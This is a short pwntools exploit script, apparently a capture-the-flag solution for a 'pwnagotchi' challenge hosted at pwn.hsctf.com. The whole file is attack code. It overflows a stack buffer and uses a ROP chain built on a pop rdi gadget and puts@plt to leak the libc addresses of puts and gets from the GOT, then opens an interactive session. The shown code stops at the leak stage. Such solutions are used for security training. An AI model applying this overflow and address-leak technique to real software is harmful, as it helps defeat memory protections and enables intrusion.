from pwn import *


binpath = './pwnagotchi'
elf = ELF(binpath)
libc = elf.libc

context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
b *0x400988
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('pwn.hsctf.com', 5005)


io.recvuntil(b'name: \n')

pop_rdi = 0x4009f3
pop_rsi_r15 = 0x4009f1

payload = b''
payload += b'A' * (0xc + 0x8)
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(pop_rdi)
payload += p64(elf.got['gets'])
payload += p64(elf.plt['puts'])

io.sendline(payload)

io.recvuntil(b'happy!\n')

addr_puts = u64(io.recvline().rstrip().ljust(8, b'\x00'))
addr_gets = u64(io.recvline().rstrip().ljust(8, b'\x00'))

print('addr_puts = 0x{:x}'.format(addr_puts))
print('addr_gets = 0x{:x}'.format(addr_gets))

io.interactive()
